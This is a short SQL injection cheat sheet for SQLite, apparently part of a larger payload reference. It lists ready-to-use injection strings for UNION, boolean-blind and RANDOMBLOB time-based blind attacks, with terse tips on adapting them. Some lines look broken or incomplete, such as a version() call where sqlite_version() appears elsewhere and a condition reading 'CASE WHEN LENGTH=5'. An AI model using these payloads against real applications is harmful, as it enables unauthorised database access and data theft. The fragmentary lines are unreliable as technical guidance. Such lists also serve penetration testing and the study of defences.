# SQLite

## Error-based
Limited; use union or blind, as errors may not leak data directly.

To force error with data: difficult, use ' AND 1/0 -- but no data leak.

## Union query-based
' UNION SELECT NULL, sqlite_version() --

No current user; use version as similar basic info.

## Boolean-based blind
' AND LENGTH(version())>16 -- (adapt for data; assume 'admin' string for example)

But for actual, binary as in SQL.

## Time-based blind
Use RANDOMBLOB for slow computation.

Base: ' AND LIKE('A',UPPER(HEX(RANDOMBLOB(100000000/2)))) --

Condition: ' AND CASE WHEN LENGTH=5 THEN LIKE(...) ELSE 1 END --

Adapt binary.

